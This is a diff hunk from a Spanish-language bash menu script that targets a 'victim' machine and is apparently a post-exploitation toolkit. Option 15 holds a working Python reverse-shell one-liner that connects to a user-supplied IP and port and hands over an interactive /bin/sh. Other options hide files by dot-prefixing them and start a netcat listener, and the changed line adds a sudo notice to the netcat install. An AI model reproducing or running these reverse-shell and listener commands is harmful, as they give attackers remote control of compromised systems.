@@ -44,7 +44,7 @@ echo "$(tput setaf 3)Introduzca aqui el numero de comando que desea ejecutar >" 
 		15) echo "Con esta opcion puedes reedirigir la conexion reversa hacia otro dispositivo en escucha" && read -p "Introduzca la IP que a la que quiere conectar a la victima > " ip && echo "Escriba el puerto al que quieres reedirigir la sesion" && read -p "> " puerto && python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$ip'",'$puerto'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 		16) echo "escribe el nombre del archivo que quiere ocultar> " read -p "> " hidden  && mv $hidden "."$hidden
 		17) echo "Introduzca la IP que realizará ping la maquina victima > " read -p "> " ping && ping $ping
-		18) apt-get install netcat && echo "Introduzca el puerto de escucha > " read -p "> " listener && nc -nlvp $listener
+		18) echo "necesita permiso sudo su para esta operacion" && sudo apt-get install netcat && echo "Introduzca el puerto de escucha > " read -p "> " listener && nc -nlvp $listener
 		
 	esac
 done 
